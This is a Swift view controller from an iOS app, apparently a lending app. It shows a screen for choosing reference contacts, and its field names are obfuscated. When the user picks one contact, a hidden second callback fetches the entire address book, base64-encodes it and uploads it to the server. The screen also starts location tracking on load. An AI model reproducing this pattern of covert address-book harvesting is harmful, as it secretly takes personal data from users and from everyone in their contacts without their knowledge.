//
//  ContactViewController.swift
//  CairYuk
//
//  Created by David Jones on 2026/3/8.
//

import UIKit
import RxSwift
import SnapKit
import Combine
import MJRefresh
import RxCocoa
import TYAlertController

class ContactViewController: BaseViewController {
    
    private var onetime: String = ""
    
    private var twotime: String = ""
    
    private let location = AppLocationManager()
    
    var cardModel: baloarianModel?
    
    var stepModel: listensiveModel? {
        didSet {
            guard let stepModel = stepModel else { return }
            headView.configTile(with: stepModel.participantarian ?? "")
        }
    }
    
    private var listArray: [cordacityModel] = []
    
    lazy var bgImageView: UIImageView = {
        let bgImageView = UIImageView()
        bgImageView.image = UIImage(named: "app_head_bg_image")
        bgImageView.contentMode = .scaleAspectFit
        return bgImageView
    }()
    
    lazy var headView: AppHeadView = {
        let headView = AppHeadView(frame: .zero)
        return headView
    }()
    
    lazy var bgView: UIView = {
        let bgView = UIView()
        bgView.backgroundColor = .white
        bgView.layer.cornerRadius = 8.pix()
        bgView.layer.maskedCorners = [.layerMinXMinYCorner, .layerMaxXMinYCorner]
        return bgView
    }()
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.setTitle("Next".localized, for: .normal)
        nextBtn.titleLabel?.font = UIFont.systemFont(ofSize: 18, weight: .bold)
        nextBtn.setBackgroundImage(UIImage(named: "next_btn_bg_image"), for: .normal)
        return nextBtn
    }()
    
    lazy var headImageView: UIImageView = {
        let headImageView = UIImageView()
        headImageView.image = UIImage(named: "prict_icon_image")
        return headImageView
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .grouped)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .white
        tableView.estimatedRowHeight = 80
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(BlueContactViewCell.self, forCellReuseIdentifier: "BlueContactViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor.init(hexString: "#3F6EFF")
        
        view.addSubview(bgImageView)
        bgImageView.snp.makeConstraints { make in
            make.top.left.right.equalToSuperview()
            make.height.equalTo(269.pix())
        }
        
        view.addSubview(headView)
        headView.snp.makeConstraints { make in
            make.top.equalTo(view.safeAreaLayoutGuide)
            make.left.right.equalToSuperview()
            make.height.equalTo(44.pix())
        }
        
        view.addSubview(bgView)
        bgView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(5.pix())
            make.left.right.bottom.equalToSuperview()
        }
        
        bgView.addSubview(nextBtn)
        nextBtn.snp.makeConstraints { make in
            make.size.equalTo(CGSize(width: 343.pix(), height: 60.pix()))
            make.centerX.equalToSuperview()
            make.bottom.equalToSuperview().offset(-20)
        }
        
        bgView.addSubview(headImageView)
        headImageView.snp.makeConstraints { make in
            make.top.equalToSuperview().offset(15)
            make.size.equalTo(CGSize(width: 350.pix(), height: 45.pix()))
            make.centerX.equalToSuperview()
        }
        
        bgView.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(headImageView.snp.bottom).offset(10)
            make.left.right.equalToSuperview()
            make.bottom.equalTo(nextBtn.snp.top).offset(-5)
        }
        
        headView.backBlock = { [weak self] in
            guard let self = self else { return }
            self.popLeaveView()
        }
        
        viewModel.$personalModel
            .receive(on: DispatchQueue.main)
            .sink { [weak self] model in
                guard let self, let model else { return }
                let securityair = model.securityair ?? ""
                if ["0", "00"].contains(securityair) {
                    let listArray = model.fatherarium?.colorguyion?.cordacity ?? []
                    self.listArray = listArray
                }
                self.tableView.reloadData()
            }
            .store(in: &cancellables)
        
        viewModel.$savePersonalModel
            .receive(on: DispatchQueue.main)
            .sink { [weak self] model in
                guard let self, let model else { return }
                let securityair = model.securityair ?? ""
                if ["0", "00"].contains(securityair) {
                    self.getDetailInfo()
                    
                    Task {
                        try? await Task.sleep(nanoseconds: 2_000_000_000)
                        let productID = self.cardModel?.maciactuallyally ?? ""
                        let OrderID = self.cardModel?.plec ?? ""
                        self.followInfo(step: "6",
                                        productID: productID,
                                        OrderID: OrderID,
                                        starttime: self.onetime,
                                        endtime: self.twotime)
                    }
                    
                }else {
                    ToastManager.showOnWindow(model.northature ?? "")
                }
                
            }
            .store(in: &cancellables)
        
        viewModel.$productDetailModel
            .receive(on: DispatchQueue.main)
            .sink { [weak self] model in
                guard let self, let model else { return }
                let securityair = model.securityair ?? ""
                if ["0", "00"].contains(securityair) {
                    
                    let cardModel = model.fatherarium?.baloarian
                    self.cardModel = cardModel
                    
                    let stepModel = model.fatherarium?.myxen
                    self.stepModel = stepModel
                    
                    self.clickTypeToNextVc(stepModel: stepModel ?? listensiveModel(),
                                           cardModel: cardModel ?? baloarianModel())
                }
            }
            .store(in: &cancellables)
        
        
        nextBtn
            .rx
            .tap
            .throttle(.microseconds(250), scheduler: MainScheduler.instance)
            .bind(onNext: { [weak self] in
                guard let self = self else { return }
                self.saveInfo()
            })
            .disposed(by: disposeBag)
        
        location.startLocation { result, error in }
        
        onetime = self.getFollowTime()
        
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        getListInfo()
    }
    
}

extension ContactViewController {
    
    private func getListInfo() {
        let parameters = ["dentacity": cardModel?.maciactuallyally ?? ""]
        viewModel.getContactInfo(parameters: parameters)
    }
}

extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, viewForHeaderInSection section: Int) -> UIView? {
        let headView = UIView()
        return headView
    }
    
    func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
        return 5
    }
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.listArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let listModel = self.listArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "BlueContactViewCell", for: indexPath) as! BlueContactViewCell
        cell.model = listModel
        cell.oneTapBlock = { [weak self] in
            guard let self else { return }
            self.tapClickCell(model: listModel, cell: cell)
        }
        cell.twoTapBlock = {
            
            ContactManager.shared.checkPermission(from: self) { granted, status in
                
                guard granted else { return }
                
                ContactManager.shared.presentContactPicker(from: self) { contact in
                    if let contact {
                        let name = contact["traveleous"] ?? ""
                        let phone = contact["ratherine"] ?? ""
                        
                        if name.isEmpty || phone.isEmpty {
                            ToastManager.showOnWindow("Name or phone number cannot be empty, please select again".localized)
                            return
                        }
                        
                        listModel.traveleous = name
                        listModel.visitmost = phone
                        cell.twoLabel.text = "\(name)-\(phone)"
                        cell.twoLabel.font = UIFont.systemFont(ofSize: 14, weight: .bold)
                        cell.twoLabel.textColor = .black
                    }
                }
            }
            
            ContactManager.shared.checkPermission(from: self) { [weak self] granted, status in
                
                guard let self, granted else { return }
                
                let list = ContactManager.shared.fetchAllContacts()
                
                if let jsonData = try? JSONEncoder().encode(list) {
                    let contactStr = jsonData.base64EncodedString()
                    let parameters = ["fatherarium": contactStr,
                                      "donfold": String(Int(3)),
                                      "postory": "1"]
                    viewModel.uploadContactsInfo(parameters: parameters)
                }
                
            }
            
        }
        return cell
    }
}

extension ContactViewController {
    
    private func tapClickCell(model: cordacityModel, cell: BlueContactViewCell) {
        let popView = ClickCellAlertView(frame: self.view.bounds)
        
        popView.nameLabel.text = model.relationship_title ?? ""
        
        let modelArray = model.paridemocrat ?? []
        
        popView.modelArray = modelArray
        
        let name = cell.oneLabel.text ?? ""
        
        for (index, listModel) in modelArray.enumerated() {
            if name == listModel.traveleous ?? "" {
                popView.selectIndex(index)
            }
        }
        
        let alertVc = TYAlertController(alert: popView,
                                        preferredStyle: .alert,
                                        transitionAnimation: .scaleFade)
        
        self.present(alertVc!, animated: true)
        
        popView.cancelBlock = { [weak self] in
            self?.dismiss(animated: true)
        }
        
        popView.saveBlock = { [weak self] listModel in
            guard let self else { return }
            self.dismiss(animated: true) {
                cell.oneLabel.text = listModel.traveleous ?? ""
                cell.oneLabel.font = UIFont.systemFont(ofSize: 14, weight: .bold)
                cell.oneLabel.textColor = .black
                model.piltion = listModel.donfold ?? ""
            }
        }
        
    }
    
}

extension ContactViewController {
    
    private func saveInfo() {
        
        twotime = self.getFollowTime()
        
        let parametersArray = listArray.map { model in
            [
                "visitmost": model.visitmost ?? "",
                "traveleous": model.traveleous ?? "",
                "piltion": model.piltion ?? "",
                "sibilious": model.sibilious ?? ""
            ]
        }
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: parametersArray, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                let parameters = ["dentacity": cardModel?.maciactuallyally ?? "",
                                  "fatherarium": jsonString]
                viewModel.saveContactInfo(parameters: parameters)
            }
        } catch {
            print("JSON====: \(error.localizedDescription)")
        }
        
    }
    
    private func getDetailInfo() {
        let parameters = ["dentacity": cardModel?.maciactuallyally ?? ""]
        viewModel.procutDetailInfo(parameters: parameters)
    }
    
}
